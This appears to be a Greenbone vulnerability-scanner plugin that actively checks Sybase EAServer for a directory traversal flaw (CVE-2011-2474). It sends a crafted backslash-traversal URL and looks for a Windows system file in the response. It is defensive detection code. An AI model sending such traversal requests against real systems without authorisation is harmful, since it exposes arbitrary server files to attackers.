# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:sybase:easerver";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103478");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-04-25 14:01:37 +0200 (Wed, 25 Apr 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2011-2474");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Sybase EAServer Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("sybase_easerver_http_detect.nasl");
  script_mandatory_keys("sybase/easerver/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Sybase EAServer is prone to a directory traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to view arbitrary
  files within the context of the webserver. Information harvested may aid in launching further
  attacks.");

  script_tag(name:"solution", value:"The vendor has released fixes. Please see the references for
  more information.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47987");
  script_xref(name:"URL", value:"http://www.sybase.com/products/modelingdevelopment/easerver");
  script_xref(name:"URL", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=912");
  script_xref(name:"URL", value:"http://www.sybase.com/detail?id=1093216");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {
  file = files[pattern];
  pattern = str_replace( find:"\", string:file, replace:"\\" );

  url = string( "/.\\..\\.\\..\\.\\..\\.\\", file );

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
